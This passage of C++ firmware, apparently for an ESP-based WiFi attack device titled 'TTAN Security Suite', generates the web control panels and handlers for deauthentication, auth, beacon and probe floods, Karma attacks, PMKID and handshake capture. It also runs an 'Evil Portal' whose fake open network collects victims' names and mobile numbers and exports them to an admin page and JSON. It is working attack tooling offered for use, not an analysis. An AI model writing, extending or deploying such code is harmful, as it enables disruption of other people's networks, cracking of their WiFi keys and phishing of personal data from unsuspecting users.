    page += ".empty{text-align:center;color:#ff0;padding:40px;font-size:1.1em}";
    page += ".btn-group{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin:20px 0}";
    page += ".btn{padding:15px;text-align:center;border:2px solid;border-radius:8px;text-decoration:none;display:block;font-weight:bold;transition:all 0.3s;cursor:pointer}";
    page += ".btn-export{background:#001a1a;color:#0ff;border-color:#0ff}";
    page += ".btn-export:hover{background:#0ff;color:#000}";
    page += ".btn-clear{background:#1a0000;color:#f00;border-color:#f00}";
    page += ".btn-clear:hover{background:#f00;color:#fff}";
    page += ".btn-back{background:#1a1a00;color:#ff0;border-color:#ff0}";
    page += ".btn-back:hover{background:#ff0;color:#000}";
    page += ".stat{display:inline-block;margin:10px;padding:10px 20px;background:#0a0e27;border-radius:5px;border:1px solid #0f0;color:#0f0}";
    page += "textarea{width:100%;min-height:300px;background:#000;color:#0f0;border:2px solid #0f0;padding:10px;font-family:'Courier New',monospace;font-size:0.9em;border-radius:5px}";
    page += ".export-section{margin:20px 0;display:none}";
    page += ".export-section.show{display:block}";
    page += "</style></head><body><div class='wrap'>";
    
    page += "<h1>🔐 HANDSHAKE CAPTURE</h1>";
    
    if (state.handshakeActive) {
      page += "<div class='info'>";
      page += "<b style='color:#0f0;font-size:1.2em'>⚡ CAPTURE ACTIVE</b><br>";
      page += "<div style='margin-top:10px;color:#0ff'>";
      page += "Channel: <b>" + String(state.targetChannel) + "</b><br>";
      page += "Packets: <b>" + String(state.packetCount) + "</b><br>";
      page += "EAPOL frames: <b>" + String(state.eapolCount) + "</b><br>";
      page += "Complete handshakes: <b>" + String(state.handshakeCount) + "</b><br>";
      page += "Runtime: <b>" + Utils::formatUptime(millis() - state.startTime) + "</b>";
      page += "</div></div>";
    } else {
      page += "<div class='info' style='border-color:#666;color:#666'>";
      page += "<b>⭕ CAPTURE INACTIVE</b><br>";
      page += "Start handshake capture from the main dashboard.";
      page += "</div>";
    }
    
    page += "<div class='count'>📊 Total Handshakes: " + String(state.handshakeCount) + "</div>";
    
    page += "<div class='btn-group'>";
    page += "<a href='#' class='btn btn-export' onclick='toggleExport();return false'>📄 Export as Text</a>";
    page += "<a href='/handshake/clear' class='btn btn-clear' onclick='return confirm(\"Clear all captured handshakes?\")'>🗑️ Clear All Data</a>";
    page += "<a href='http://" + WiFi.softAPIP().toString() + "' class='btn btn-back'>⬅️ Back to Dashboard</a>";
    page += "</div>";
    
    page += "<div id='exportSection' class='export-section'>";
    page += "<h3 style='color:#0ff'>Handshake Export:</h3>";
    page += "<textarea id='exportText' readonly>";
    
    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
      if (state.handshakes[i].complete) {
        page += "Handshake #" + String(i + 1) + " from " + Utils::macToString(state.handshakes[i].bssid) + "\n";
        page += "Frame count: " + String(state.handshakes[i].frameCount) + "\n";
        page += "Frame lengths: ";
        for (int j = 0; j < state.handshakes[i].frameCount; j++) {
          page += String(state.handshakes[i].frameLengths[j]);
          if (j < state.handshakes[i].frameCount - 1) page += ", ";
        }
        page += "\n\n";
      }
    }
    
    page += "</textarea>";
    page += "<button class='btn btn-export' style='margin-top:10px' onclick='copyToClipboard()'>📋 Copy to Clipboard</button>";
    page += "</div>";
    
    page += "<h2 style='color:#0f0;margin-top:30px;border-bottom:2px solid #0f0;padding-bottom:10px'>📝 Captured Handshakes</h2>";
    
    if (state.handshakeCount > 0) {
      for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
        if (state.handshakes[i].complete) {
          page += "<div class='handshake'>";
          page += "<b style='color:#0f0'>Handshake #" + String(i + 1) + "</b><br>";
          page += "<span style='color:#0ff'>BSSID: " + Utils::macToString(state.handshakes[i].bssid) + "</span><br>";
          page += "<span style='color:#ff0'>Frame count: " + String(state.handshakes[i].frameCount) + "</span>";
          page += "</div>";
        }
      }
    } else {
      page += "<div class='empty'> No handshakes captured yet.<br><br>";
      page += "The capture must be active and a client must authenticate to the network.</div>";
    }
    
    page += "</div>";
    page += "<script>";
    page += "function toggleExport(){";
    page += "var section=document.getElementById('exportSection');";
    page += "section.classList.toggle('show');}";
    page += "function copyToClipboard(){";
    page += "var text=document.getElementById('exportText');";
    page += "text.select();";
    page += "document.execCommand('copy');";
    page += "alert('Copied to clipboard!');}";
    page += "</script>";
    page += "</body></html>";
    
    return page;
  }
}

namespace AdminHandlers {
  void handleAdminRoot() {
    String page = "<!DOCTYPE html><html><head>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<meta charset='UTF-8'>";
    page += "<title>Admin Panel - Captured Data</title><style>";
    page += "body{font-family:'Courier New',monospace;background:#1a0000;color:#f00;padding:20px;margin:0}";
    page += ".wrap{max-width:1000px;margin:0 auto}";
    page += "h1{color:#f00;text-shadow:0 0 15px #f00;text-align:center;font-size:2em;border-bottom:2px solid #f00;padding-bottom:10px}";
    page += ".info{background:#0f1419;padding:15px;border:2px solid #f00;border-radius:8px;margin:20px 0;box-shadow:0 0 20px rgba(255,0,0,0.3)}";
    page += ".cred{background:#0f1419;padding:15px;margin:10px 0;border-radius:8px;border-left:5px solid #f00;box-shadow:0 0 15px rgba(255,0,0,0.2);word-wrap:break-word}";
    page += ".count{color:#ff0;font-size:1.3em;text-align:center;margin:20px 0;padding:15px;background:#1a1a00;border:2px solid #ff0;border-radius:8px}";
    page += ".time{color:#0ff;font-size:0.85em}";
    page += ".empty{text-align:center;color:#ff0;padding:40px;font-size:1.1em}";
    page += ".btn-group{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin:20px 0}";
    page += ".btn{padding:15px;text-align:center;border:2px solid;border-radius:8px;text-decoration:none;display:block;font-weight:bold;transition:all 0.3s;cursor:pointer}";
    page += ".btn-export{background:#001a1a;color:#0ff;border-color:#0ff}";
    page += ".btn-export:hover{background:#0ff;color:#000}";
    page += ".btn-clear{background:#1a0000;color:#f00;border-color:#f00}";
    page += ".btn-clear:hover{background:#f00;color:#fff}";
    page += ".btn-back{background:#1a1a00;color:#ff0;border-color:#ff0}";
    page += ".btn-back:hover{background:#ff0;color:#000}";
    page += ".stat{display:inline-block;margin:10px;padding:10px 20px;background:#0a0e27;border-radius:5px;border:1px solid #0f0;color:#0f0}";
    page += "textarea{width:100%;min-height:300px;background:#000;color:#0f0;border:2px solid #0f0;padding:10px;font-family:'Courier New',monospace;font-size:0.9em;border-radius:5px}";
    page += ".export-section{margin:20px 0;display:none}";
    page += ".export-section.show{display:block}";
    page += "</style></head><body><div class='wrap'>";
    
    page += "<h1>🔐 ADMIN PANEL - PORT " + String(Config::ADMIN_PORT) + "</h1>";
    
    if (state.portalActive) {
      page += "<div class='info'>";
      page += "<b style='color:#f00;font-size:1.2em'>⚡ PORTAL ACTIVE</b><br>";
      page += "<div style='margin-top:10px;color:#0f0'>";
      page += "Fake SSID: <b>" + state.currentPortalSSID + "</b><br>";
      page += "Portal IP: <b>" + WiFi.softAPIP().toString() + "</b><br>";
      page += "Victims Connected: <b>" + String(WiFi.softAPgetStationNum()) + "</b><br>";
      page += "Runtime: <b>" + Utils::formatUptime(millis() - state.startTime) + "</b>";
      page += "</div></div>";
    } else {
      page += "<div class='info' style='border-color:#666;color:#666'>";
      page += "<b>⭕ PORTAL INACTIVE</b><br>";
      page += "Start the Evil Portal from the main dashboard to capture victim information.";
      page += "</div>";
    }
    
    page += "<div class='count'>📊 Total Victims: " + String(state.credentialCount) + "</div>";
    
    page += "<div class='btn-group'>";
    page += "<a href='#' class='btn btn-export' onclick='toggleExport();return false'>📄 Export as Text</a>";
    page += "<a href='/admin/json' class='btn btn-export' target='_blank'>📋 Export as JSON</a>";
    page += "<a href='/admin/clear' class='btn btn-clear' onclick='return confirm(\"Clear all captured victim data?\")'>🗑️ Clear All Data</a>";
    page += "<a href='http://" + WiFi.softAPIP().toString() + "' class='btn btn-back'>⬅️ Back to Dashboard</a>";
    page += "</div>";
    
    page += "<div id='exportSection' class='export-section'>";
    page += "<h3 style='color:#0ff'>Victim Data Export:</h3>";
    page += "<textarea id='exportText' readonly>";
    for (int i = 0; i < state.credentialCount; i++) {
      page += state.credentials[i] + "\n";
    }
    page += "</textarea>";
    page += "<button class='btn btn-export' style='margin-top:10px' onclick='copyToClipboard()'>📋 Copy to Clipboard</button>";
    page += "</div>";
    
    page += "<h2 style='color:#f00;margin-top:30px;border-bottom:2px solid #f00;padding-bottom:10px'>📝 Captured Victim Information</h2>";
    
    if (state.credentialCount > 0) {
      for (int i = state.credentialCount - 1; i >= 0; i--) {  
        page += "<div class='cred'>";
        page += "<b style='color:#f00'>#" + String(state.credentialCount - i) + "</b><br>";
        page += "<span style='color:#0f0'>" + state.credentials[i] + "</span>";
        page += "</div>";
      }
    } else {
      page += "<div class='empty'> No victim information captured yet.<br><br>";
      page += "The portal must be active and victims must connect and enter their details.</div>";
    }
    
    page += "</div>";
    page += "<script>";
    page += "function toggleExport(){";
    page += "var section=document.getElementById('exportSection');";
    page += "section.classList.toggle('show');}";
    page += "function copyToClipboard(){";
    page += "var text=document.getElementById('exportText');";
    page += "text.select();";
    page += "document.execCommand('copy');";
    page += "alert('Copied to clipboard!');}";
    page += "</script>";
    page += "</body></html>";
    
    state.adminServer->send(200, "text/html", page);
  }
  
  void handleAdminJSON() {
    String json = "{\"victims\":[";
    
    for (int i = 0; i < state.credentialCount; i++) {
      if (i > 0) json += ",";
      
      String cred = state.credentials[i];
      int timeEnd = cred.indexOf(']');
      int separator = cred.indexOf(" : ");
      
      String timestamp = cred.substring(1, timeEnd);
      String name = cred.substring(timeEnd + 2, separator);
      String mobile = cred.substring(separator + 3);
      
      json += "{";
      json += "\"id\":" + String(i + 1) + ",";
      json += "\"timestamp\":\"" + timestamp + "\",";
      json += "\"name\":\"" + name + "\",";
      json += "\"mobile\":\"" + mobile + "\"";
      json += "}";
    }
    
    json += "],";
    json += "\"total\":" + String(state.credentialCount) + ",";
    json += "\"portal_active\":" + String(state.portalActive ? "true" : "false") + ",";
    json += "\"portal_ssid\":\"" + state.currentPortalSSID + "\",";
    json += "\"uptime\":\"" + Utils::formatUptime(millis() - state.startTime) + "\"";
    json += "}";
    
    state.adminServer->send(200, "application/json", json);
  }
  
  void handleAdminClear() {
    state.credentialCount = 0;
    for (int i = 0; i < Config::MAX_CREDENTIALS; i++) {
      state.credentials[i] = "";
    }
    
    Serial.println("ADMIN: All victim data cleared");
    
    state.adminServer->sendHeader("Location", "/admin");
    state.adminServer->send(302);
  }
  
  void handleAdminNotFound() {
    state.adminServer->sendHeader("Location", "/admin");
    state.adminServer->send(302);
  }
}

namespace Handlers {
  void handleRoot() {
    if (state.portalActive) {
      state.server->send(200, "text/html", HTML::getCaptivePortal());
      return;
    }
    
    state.totalRequests++;
    
    String page = "<!DOCTYPE html><html><head>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<meta http-equiv='refresh' content='5'>";
    page += "<meta charset='UTF-8'>";
    page += "<title>TTAN Security Suite</title><style>";
    page += "body{margin:0;padding:10px;font-family:'Courier New',monospace;background:#0a0e27;color:#0f0}";
    page += ".wrap{max-width:1200px;margin:0 auto}";
    page += "h1{text-align:center;color:#0f0;font-size:1.8em;margin:15px 0;text-shadow:0 0 10px #0f0}";
    page += ".box{background:#0f1419;border:2px solid #0f0;border-radius:8px;padding:15px;margin:10px 0;box-shadow:0 0 15px rgba(0,255,0,0.2)}";
    page += ".active{border-color:#f00;background:#1a0000;box-shadow:0 0 15px rgba(255,0,0,0.3)}";
    page += ".warn{background:#ff0;color:#000;padding:10px;text-align:center;font-weight:bold;margin:10px 0;border-radius:5px;animation:pulse 1s infinite}";
    page += "@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.7}}";
    page += ".grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin:12px 0}";
    page += ".btn{padding:12px;text-align:center;border:2px solid;border-radius:6px;text-decoration:none;display:block;font-size:0.95em;font-weight:bold;transition:all 0.3s}";
    page += ".b1{background:#001a1a;color:#0ff;border-color:#0ff}";
    page += ".b1:hover{background:#0ff;color:#000}";
    page += ".b2{background:#1a1a00;color:#ff0;border-color:#ff0}";
    page += ".b2:hover{background:#ff0;color:#000}";
    page += ".b3{background:#1a0000;color:#f00;border-color:#f00}";
    page += ".b3:hover{background:#f00;color:#fff}";
    page += ".b4{background:#1a001a;color:#f0f;border-color:#f0f}";
    page += ".b4:hover{background:#f0f;color:#fff}";
    page += "table{width:100%;border-collapse:collapse;font-size:0.85em;margin:10px 0}";
    page += "th,td{border:1px solid #0f0;padding:8px;text-align:left}";
    page += "th{background:#001a00;font-weight:bold}";
    page += ".mini{padding:4px 8px;background:#0a5;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:0.75em}";
    page += ".mini:hover{background:#0c7}";
    page += ".stat{display:inline-block;margin:5px 10px;padding:8px 15px;background:#001a00;border-radius:5px;border:1px solid #0f0;color:#0f0}";
    page += ".badge{background:#f00;color:#fff;padding:2px 6px;border-radius:10px;font-size:0.8em;margin-left:5px}";
    page += ".error{color:#f00;font-size:0.9em;margin-top:10px}";
    page += "</style></head><body><div class='wrap'>";
    
    page += "<h1> TTAN SECURITY SUITE v2.2 </h1>";
    page += "<div style='text-align:center;color:#ff0;font-size:0.9em;margin-bottom:15px'> Enhanced WiFi Penetration Testing </div>";
    
    if (state.deauthActive || state.pmkidActive || state.portalActive || state.snifferActive || 
        state.handshakeActive || state.beaconFloodActive || state.probeFloodActive || state.authFloodActive || state.karmaActive) {
      page += "<div class='warn'> ATTACK IN PROGRESS </div>";
    }
    
    page += "<div class='box'><b> SYSTEM STATUS</b><br>";
    page += "<div class='stat'> Clients: " + String(WiFi.softAPgetStationNum()) + "</div>";
    page += "<div class='stat'> Uptime: " + Utils::formatUptime(millis() - state.startTime) + "</div>";
    page += "<div class='stat'> Free RAM: " + String(ESP.getFreeHeap() / 1024) + " KB</div>";
    page += "<div class='stat'> Requests: " + String(state.totalRequests) + "</div>";
    page += "<div class='stat'> Errors: " + String(state.errorCount) + "</div>";
    if (state.errorCount > 0) {
      page += "<div class='error'>Last error: " + state.lastError + "</div>";
    }
    page += "</div>";
    
    page += "<div class='box'><b> RECONNAISSANCE</b><div class='grid'>";
    page += "<a href='/s' class='btn b1'>WiFi Scan</a>";
    page += "<a href='/h' class='btn b1'>Host Scan</a>";
    page += "<a href='/x' class='btn b1'>Clear Logs</a>";
    page += "<a href='/stop' class='btn b4'>Stop All</a>";
    page += "<a href='/r' class='btn b3'>Reboot</a>";
    page += "</div></div>";
    
    String boxClass = (state.deauthActive || state.pmkidActive || state.portalActive || state.snifferActive ||
                      state.handshakeActive || state.beaconFloodActive || state.probeFloodActive || state.authFloodActive || state.karmaActive) ? "box active" : "box";
    page += "<div class='" + boxClass + "'>";
    page += "<b>⚔️ ATTACK VECTORS</b><br>";
    page += "Channel: <select id='ch' style='background:#000;color:#0f0;border:1px solid #0f0;padding:5px'>";
    for (int i = 1; i <= 13; i++) {
      String selected = (i == state.targetChannel) ? " selected" : "";
      page += "<option" + selected + ">" + String(i) + "</option>";
    }
    page += "</select><div class='grid' style='margin-top:10px'>";
    
    if (state.deauthActive) {
      page += "<a href='/ds' class='btn b3'>STOP Deauth</a>";
    } else {
      page += "<span class='btn b2' style='opacity:0.6;cursor:not-allowed'>Deauth (Scan)</span>";
    }
    
    if (state.pmkidActive) {
      page += "<a href='/ps' class='btn b3'>STOP PMKID</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startPMKID()'>PMKID Capture</a>";
    }
    
    if (state.handshakeActive) {
      page += "<a href='/hs' class='btn b3'>STOP Handshake</a>";
      page += "<a href='/handshake' class='btn b1' target='_blank'>View Handshakes";
      if (state.handshakeCount > 0) {
        page += "<span class='badge'>" + String(state.handshakeCount) + "</span>";
      }
      page += "</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startHandshake()'>Handshake Capture</a>";
    }
    
    if (state.portalActive) {
      page += "<a href='/es' class='btn b3'>STOP Portal</a>";
      page += "<a href='http://" + WiFi.softAPIP().toString() + ":" + String(Config::ADMIN_PORT) + "/admin' class='btn b2' target='_blank'>View Victims";
      if (state.credentialCount > 0) {
        page += "<span class='badge'>" + String(state.credentialCount) + "</span>";
      }
      page += "</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startPortal()'>Evil Portal</a>";
    }
    
    if (state.snifferActive) {
      page += "<a href='/ns' class='btn b3'>STOP Sniffer</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startSniffer()'>Packet Sniffer</a>";
    }
    
    if (state.beaconFloodActive) {
      page += "<a href='/bs' class='btn b3'>STOP Beacon</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startBeacon()'>Beacon Flood</a>";
    }
    
    if (state.probeFloodActive) {
      page += "<a href='/prs' class='btn b3'>STOP Probe</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startProbe()'>Probe Flood</a>";
    }
    
    if (state.authFloodActive) {
      page += "<a href='/aus' class='btn b3'>STOP Auth</a>";
    } else {
      page += "<span class='btn b2' style='opacity:0.6;cursor:not-allowed'>Auth Flood (Scan)</span>";
    }
    
    if (state.karmaActive) {
      page += "<a href='/ks' class='btn b3'>STOP Karma</a>";
    } else {
      page += "<a href='#' class='btn b2' onclick='startKarma()'>Karma Attack</a>";
    }
    
    page += "</div></div>";
    
    if (state.deauthActive) {
      page += "<div class='box active'><b> DEAUTH STATUS</b><br>" + state.deauthData + "</div>";
    }
    
    if (state.pmkidActive) {
      page += "<div class='box active'><b> PMKID STATUS</b><br>" + state.pmkidData;
      page += "<br>Total packets: " + String(state.packetCount);
      page += "<br>EAPOL frames: " + String(state.eapolCount) + "</div>";
    }
    
    if (state.handshakeActive) {
      page += "<div class='box active'><b>🔐 HANDSHAKE STATUS</b><br>" + state.handshakeData;
      page += "<br>Total packets: " + String(state.packetCount);
      page += "<br>EAPOL frames: " + String(state.eapolCount);
      page += "<br>Complete handshakes: " + String(state.handshakeCount) + "</div>";
    }
    
    if (state.portalActive) {
      page += "<div class='box active'><b>🎣 PORTAL STATUS</b><br>" + state.credentialData;
      page += "<br><b>Access Admin Panel:</b> http://" + WiFi.softAPIP().toString() + ":" + String(Config::ADMIN_PORT) + "/admin</div>";
    }
    
    if (state.snifferActive) {
      page += "<div class='box active'><b>📡 SNIFFER STATUS</b><br>Channel: " + String(state.targetChannel);
      page += "<br>Packets: " + String(state.packetCount) + "</div>";
    }
    
    if (state.beaconFloodActive) {
      page += "<div class='box active'><b>📡 BEACON FLOOD STATUS</b><br>" + state.beaconData;
      page += "<br>Beacons sent: " + String(state.beaconCount) + "</div>";
    }
    
    if (state.probeFloodActive) {
      page += "<div class='box active'><b>📡 PROBE FLOOD STATUS</b><br>" + state.probeData;
      page += "<br>Probes sent: " + String(state.probeCount) + "</div>";
    }
    
    if (state.authFloodActive) {
      page += "<div class='box active'><b>📡 AUTH FLOOD STATUS</b><br>" + state.authData;
      page += "<br>Auths sent: " + String(state.authCount) + "</div>";
    }
    
    if (state.karmaActive) {
      page += "<div class='box active'><b>📡 KARMA STATUS</b><br>" + state.karmaData;
      page += "<br>Responses sent: " + String(state.karmaCount) + "</div>";
    }
    
    if (state.scanData.length() > 0 && !state.scanData.startsWith("Click")) {
      page += "<div class='box'><b> SCAN RESULTS</b><br>" + state.scanData + "</div>";
    }
    
    if (state.hostData.length() > 0 && !state.hostData.startsWith("Click")) {
      page += "<div class='box'><b> HOST SCAN</b><br>" + state.hostData + "</div>";
    }
    
    page += "</div>";
    page += "<script>";
    page += "function atk(m,c,s){if(confirm('Start deauth attack on '+s+'?'))window.location='/d?m='+m+'&c='+c+'&s='+encodeURIComponent(s)}";
    page += "function atk2(m,c){if(confirm('Start auth flood on '+m+'?'))window.location='/au?m='+m+'&c='+c}";
    page += "function startPMKID(){var c=document.getElementById('ch').value;window.location='/p?c='+c}";
    page += "function startHandshake(){var c=document.getElementById('ch').value;window.location='/hsh?c='+c}";
    page += "function startPortal(){var s=prompt('Enter fake SSID:','Free_WiFi');if(s)window.location='/e?s='+encodeURIComponent(s)}";
    page += "function startSniffer(){var c=document.getElementById('ch').value;window.location='/n?c='+c}";
    page += "function startBeacon(){var s=prompt('Enter SSID for beacon flood:','FakeAP');if(s){var c=document.getElementById('ch').value;window.location='/b?s='+encodeURIComponent(s)+'&c='+c}}";
    page += "function startProbe(){var s=prompt('Enter SSID for probe flood:','TargetNetwork');if(s){var c=document.getElementById('ch').value;window.location='/pr?s='+encodeURIComponent(s)+'&c='+c}}";
    page += "function startKarma(){var s=prompt('Enter SSID for Karma attack:','Free_WiFi');if(s)window.location='/k?s='+encodeURIComponent(s)}";
    page += "</script>";
    page += "</body></html>";
    
    state.server->send(200, "text/html", page);
  }
  
  void handleScan() {
    state.scanData = "<table><tr><th>SSID</th><th>Signal</th><th>CH</th><th>Security</th><th>BSSID</th><th>Action</th></tr>";
    
    WiFi.mode(WIFI_AP_STA);
    int n = WiFi.scanNetworks();
    
    if (n > 0) {
      for (int i = 0; i < n && i < Config::MAX_SCAN_RESULTS; i++) {
        String ssid = WiFi.SSID(i);
        if (ssid.length() == 0) ssid = "[Hidden]";
        ssid = Utils::sanitizeString(ssid);
        
        String encryption = Utils::encryptionTypeStr(WiFi.encryptionType(i));
        String bssid = WiFi.BSSIDstr(i);
        int channel = WiFi.channel(i);
        int rssi = WiFi.RSSI(i);
        
        String signalQuality = String(rssi) + " dBm";
        if (rssi > -50) signalQuality += " ";
        else if (rssi > -60) signalQuality += " ✓";
        else if (rssi > -70) signalQuality += " ~";
        
        state.scanData += "<tr><td>" + ssid + "</td>";
        state.scanData += "<td>" + signalQuality + "</td>";
        state.scanData += "<td>" + String(channel) + "</td>";
        state.scanData += "<td>" + encryption + "</td>";
        state.scanData += "<td style='font-size:0.75em'>" + bssid + "</td>";
        state.scanData += "<td><button class='mini' onclick='atk(\"" + bssid + "\"," + String(channel) + ",\"" + ssid + "\")'>DEAUTH</button>";
        state.scanData += "<button class='mini' onclick='atk2(\"" + bssid + "\"," + String(channel) + ")'>AUTH</button></td></tr>";
        
        Utils::resetWatchdog();
      }
      state.scanData += "</table><div style='margin-top:10px;color:#0ff'>Found " + String(n) + " network(s)</div>";
    } else {
      state.scanData += "<tr><td colspan='6' style='text-align:center'>No networks found</td></tr></table>";
    }
    
    WiFi.scanDelete();
    WiFi.mode(WIFI_AP);
    
    Serial.println("WiFi scan complete - Found " + String(n) + " networks");
    
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleHosts() {
    IPAddress localIP = WiFi.softAPIP();
    state.hostData = "<table><tr><th>IP Address</th><th>Status</th><th>Response Time</th></tr>";
    
    int hostsFound = 0;
    for (int i = 2; i < 30; i++) {
      IPAddress targetIP(localIP[0], localIP[1], localIP[2], i);
      WiFiClient client;
      client.setTimeout(100);
      
      unsigned long startMs = millis();
      if (client.connect(targetIP, 80)) {
        unsigned long responseTime = millis() - startMs;
        state.hostData += "<tr><td>" + targetIP.toString() + "</td>";
        state.hostData += "<td style='color:#0f0'>● ONLINE</td>";
        state.hostData += "<td>" + String(responseTime) + " ms</td></tr>";
        hostsFound++;
        client.stop();
      }
      
      Utils::resetWatchdog();
      yield();
    }
    
    if (hostsFound == 0) {
      state.hostData += "<tr><td colspan='3' style='text-align:center'>No active hosts detected</td></tr>";
    }
    
    state.hostData += "</table><div style='margin-top:10px;color:#0ff'>Detected " + String(hostsFound) + " host(s)</div>";
    
    Serial.println("Host scan complete - Found " + String(hostsFound) + " hosts");
    
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleDeauthStart() {
    String mac = state.server->arg("m");
    String ssid = state.server->arg("s");
    int channel = state.server->arg("c").toInt();
    
    if (mac.length() == 0) {
      state.server->send(400, "text/plain", "Missing MAC address");
      return;
    }
    
    if (Attacks::startDeauth(mac, channel, ssid)) {
      state.server->sendHeader("Location", "/");
      state.server->send(302);
    } else {
      state.server->send(400, "text/plain", "Failed to start deauth attack");
    }
  }
  
  void handleDeauthStop() {
    Attacks::stopDeauth();
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handlePMKIDStart() {
    int channel = state.server->arg("c").toInt();
    if (channel == 0) channel = 1;
    
    Attacks::startPMKID(channel);
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handlePMKIDStop() {
    Attacks::stopPMKID();
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleHandshakeStart() {
    int channel = state.server->arg("c").toInt();
    if (channel == 0) channel = 1;
    
    Attacks::startHandshake(channel);
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleHandshakeStop() {
    Attacks::stopHandshake();
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleHandshakePage() {
    state.server->send(200, "text/html", HTML::getHandshakePage());
  }
  
  void handleHandshakeClear() {
    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
      state.handshakes[i] = HandshakeData();
    }
    state.handshakeCount = 0;
    
    Serial.println("HANDSHAKE: All handshakes cleared");
    
    state.server->sendHeader("Location", "/handshake");
    state.server->send(302);
  }
  
  void handlePortalStart() {
    String fakeSSID = state.server->arg("s");
    if (fakeSSID.length() == 0) {
      fakeSSID = "Free_WiFi";
    }
    
    if (Attacks::startPortal(fakeSSID)) {
      state.server->sendHeader("Location", "/");
      state.server->send(302);
    } else {
      state.server->send(500, "text/plain", "Failed to start portal");
    }
  }
  
  void handlePortalStop() {
    Attacks::stopPortal();
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleSnifferStart() {
    int channel = state.server->arg("c").toInt();
    if (channel == 0) channel = 1;
    
    Attacks::startSniffer(channel);
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleSnifferStop() {
    Attacks::stopSniffer();
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleBeaconStart() {
    String ssid = state.server->arg("s");
    int channel = state.server->arg("c").toInt();
    if (channel == 0) channel = 1;
    if (ssid.length() == 0) ssid = "FakeAP";
    
    Attacks::startBeaconFlood(channel, ssid);
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleBeaconStop() {
    Attacks::stopBeaconFlood();
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleProbeStart() {
    String ssid = state.server->arg("s");
    int channel = state.server->arg("c").toInt();
    if (channel == 0) channel = 1;
    if (ssid.length() == 0) ssid = "TargetNetwork";
    
    Attacks::startProbeFlood(channel, ssid);
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleProbeStop() {
    Attacks::stopProbeFlood();
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleAuthStart() {
    String mac = state.server->arg("m");
    int channel = state.server->arg("c").toInt();
    
    if (mac.length() == 0) {
      state.server->send(400, "text/plain", "Missing MAC address");
      return;
    }
    
    if (Attacks::startAuthFlood(mac, channel)) {
      state.server->sendHeader("Location", "/");
      state.server->send(302);
    } else {
      state.server->send(400, "text/plain", "Failed to start auth flood");
    }
  }
  
  void handleAuthStop() {
    Attacks::stopAuthFlood();
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleKarmaStart() {
    String ssid = state.server->arg("s");
    if (ssid.length() == 0) {
      ssid = "Free_WiFi";
    }
    
    if (Attacks::startKarma(ssid)) {
      state.server->sendHeader("Location", "/");
      state.server->send(302);
    } else {
      state.server->send(500, "text/plain", "Failed to start Karma attack");
    }
  }
  
  void handleKarmaStop() {
    Attacks::stopKarma();
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleStopAll() {
    Attacks::stopAllAttacks();
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleSubmit() {
    String name = state.server->arg("name");
    String mobile = state.server->arg("mobile");
    
    name = Utils::sanitizeString(name);
    mobile = Utils::sanitizeString(mobile);
    
    if (name.length() == 0 || mobile.length() == 0) {
      state.server->send(400, "text/plain", "Invalid input");
      return;
    }
    
    if (state.credentialCount < Config::MAX_CREDENTIALS) {
      String timestamp = Utils::formatUptime(millis() - state.startTime);
      state.credentials[state.credentialCount] = "[" + timestamp + "] " + name + " : " + mobile;
      state.credentialCount++;
      
      Serial.println("VICTIM INFORMATION CAPTURED:");
      Serial.println("  Time: " + timestamp);
      Serial.println("  Name: " + name);
      Serial.println("  Mobile: " + mobile);
      
      state.credentialData = "Active - Captured: " + String(state.credentialCount) + " victim(s)";
    } else {
      Serial.println("WARNING: Victim storage full!");
    }
    
    state.server->send(200, "text/html", HTML::getSuccessPage());
  }
  
  void handleCredentials() {
    state.server->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + ":" + String(Config::ADMIN_PORT) + "/admin");
    state.server->send(302);
  }
  
  void handleClear() {
    state.scanData = "Click 'WiFi Scan' to find networks";
    state.hostData = "Click 'Host Scan' to find devices";
    state.deauthData = "Select target from scan";
    state.pmkidData = "Start PMKID capture";
    state.handshakeData = "Start handshake capture";
    state.credentialData = "Start portal to capture";
    state.beaconData = "Start beacon flood";
    state.probeData = "Start probe flood";
    state.authData = "Select target from scan";
    state.karmaData = "Start Karma attack";
    
    state.deauthCount = 0;
    state.packetCount = 0;
    state.eapolCount = 0;
    state.handshakeCount = 0;
    state.beaconCount = 0;
    state.probeCount = 0;
    state.authCount = 0;
    state.karmaCount = 0;
    state.totalRequests = 0;
    state.errorCount = 0;
    state.lastError = "";
    state.startTime = millis();
    
    Serial.println("Logs cleared");
    
    state.server->sendHeader("Location", "/");
    state.server->send(302);
  }
  
  void handleReboot() {
    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><style>";
